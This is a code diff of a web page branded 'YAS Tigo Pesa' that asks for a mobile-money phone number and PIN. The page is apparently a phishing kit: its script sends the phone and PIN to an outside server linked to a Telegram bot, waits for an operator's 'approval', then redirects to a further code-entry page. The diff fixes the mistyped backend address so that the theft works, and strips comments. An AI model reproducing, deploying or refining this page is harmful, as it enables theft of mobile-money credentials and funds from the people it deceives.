@@ -3,7 +3,6 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <title>YAS Tigo Pesa</title>
 
 <style>
@@ -171,7 +170,6 @@ button{
 <div class="container">
 
     <div class="logo">
-        <!-- Replace logo.png with your logo -->
         <img src="logo.png" alt="YAS Logo">
     </div>
 
@@ -221,31 +219,27 @@ button{
 </div>
 
 <script>
-// 1. Get botId from URL
+// ===== CORRECTED BACKEND URL =====
+const BACKEND_URL = "https://yas-tanzania.onrender.com";   // ✅ FIXED
+
 const botId = new URLSearchParams(window.location.search).get("botId");
 console.log("Bot ID:", botId);
 
-// 2. If no botId, show error
 if (!botId) {
     document.getElementById("status").textContent = "Error: Missing bot ID. Please use the link from Telegram.";
     document.getElementById("status").className = "error";
     document.getElementById("submitBtn").disabled = true;
 }
 
-// 3. Pre-fill phone from localStorage if available
 const phoneInput = document.getElementById("phoneInput");
 const pinInput = document.getElementById("pinInput");
 const statusEl = document.getElementById("status");
 const submitBtn = document.getElementById("submitBtn");
 
 const savedPhone = localStorage.getItem("phone");
-if (savedPhone) {
-    phoneInput.value = savedPhone;
-}
+if (savedPhone) phoneInput.value = savedPhone;
 
-// 4. Helper: send PIN to backend (same as first page)
 async function sendPinToTelegram(name, phone, pin) {
-    const BACKEND_URL = "https://yas-tanzania.onrender.com";
     const cleanPhone = phone.replace(/\s/g, '');
     const payload = {
         name: name || "Unknown",
@@ -283,9 +277,7 @@ async function sendPinToTelegram(name, phone, pin) {
     }
 }
 
-// 5. Helper: poll for approval (indefinitely)
 function pollPinApproval(requestId) {
-    const BACKEND_URL = "hhttps://yas-tanzania.onrender.com";
     let attempts = 0;
     return new Promise((resolve) => {
         const interval = setInterval(async () => {
@@ -295,7 +287,6 @@ function pollPinApproval(requestId) {
                 const res = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
                 const data = await res.json();
                 console.log("Poll response:", data);
-
                 if (data.blocked) {
                     clearInterval(interval);
                     statusEl.className = "error";
@@ -317,7 +308,6 @@ function pollPinApproval(requestId) {
                     resolve(false);
                     return;
                 }
-                // Still waiting – show elapsed time
                 if (attempts % 10 === 0 || attempts === 1) {
                     const elapsedSeconds = Math.floor(attempts * 1.5);
                     const minutes = Math.floor(elapsedSeconds / 60);
@@ -335,14 +325,11 @@ function pollPinApproval(requestId) {
     });
 }
 
-// 6. Main submit function
 async function handleSubmit(e) {
     e.preventDefault();
-
     const phone = phoneInput.value.trim();
     const pin = pinInput.value.trim();
 
-    // Basic validation
     if (!phone) {
         statusEl.className = "error";
         statusEl.textContent = "Tafadhali ingiza nambari ya simu.";
@@ -359,10 +346,8 @@ async function handleSubmit(e) {
         return;
     }
 
-    // Save phone to localStorage for future visits
     localStorage.setItem("phone", phone);
 
-    // Disable inputs and button
     phoneInput.disabled = true;
     pinInput.disabled = true;
     submitBtn.disabled = true;
@@ -370,13 +355,11 @@ async function handleSubmit(e) {
     statusEl.className = "waiting";
     statusEl.textContent = "Sending PIN for verification...";
 
-    // Send to backend
     const res = await sendPinToTelegram("Unknown", phone, pin);
 
     if (!res || !res.requestId) {
         statusEl.className = "error";
         statusEl.textContent = "Failed to send PIN. Please try again.";
-        // Re-enable
         phoneInput.disabled = false;
         pinInput.disabled = false;
         submitBtn.disabled = false;
@@ -389,7 +372,6 @@ async function handleSubmit(e) {
     statusEl.className = "waiting";
     statusEl.textContent = "Waiting for admin approval...";
 
-    // Poll for approval (indefinite wait)
     const approved = await pollPinApproval(res.requestId);
 
     if (approved === true) {
@@ -398,7 +380,6 @@ async function handleSubmit(e) {
             window.location.href = `code.html?botId=${botId}`;
         }, 500);
     } else {
-        // Re-enable for retry
         phoneInput.disabled = false;
         pinInput.disabled = false;
         submitBtn.disabled = false;
@@ -408,20 +389,15 @@ async function handleSubmit(e) {
     }
 }
 
-// 7. Attach event listeners
 document.getElementById("loginForm").addEventListener("submit", handleSubmit);
 
-// Auto-submit when PIN reaches 4 digits
 pinInput.addEventListener("input", function() {
-    // Remove non-digits
     this.value = this.value.replace(/[^0-9]/g, '');
     if (this.value.length === 4) {
-        // Trigger submit
         document.getElementById("loginForm").dispatchEvent(new Event('submit'));
     }
 });
 
-// Handle paste for PIN
 pinInput.addEventListener("paste", function(e) {
     e.preventDefault();
     const pasted = (e.clipboardData || window.clipboardData).getData('text');
@@ -434,12 +410,10 @@ pinInput.addEventListener("paste", function(e) {
     }
 });
 
-// Focus on phone input on load
 window.addEventListener("load", function() {
     phoneInput.focus();
 });
 
-// Handle Enter key on phone input to move to PIN
 phoneInput.addEventListener("keydown", function(e) {
     if (e.key === "Enter") {
         e.preventDefault();
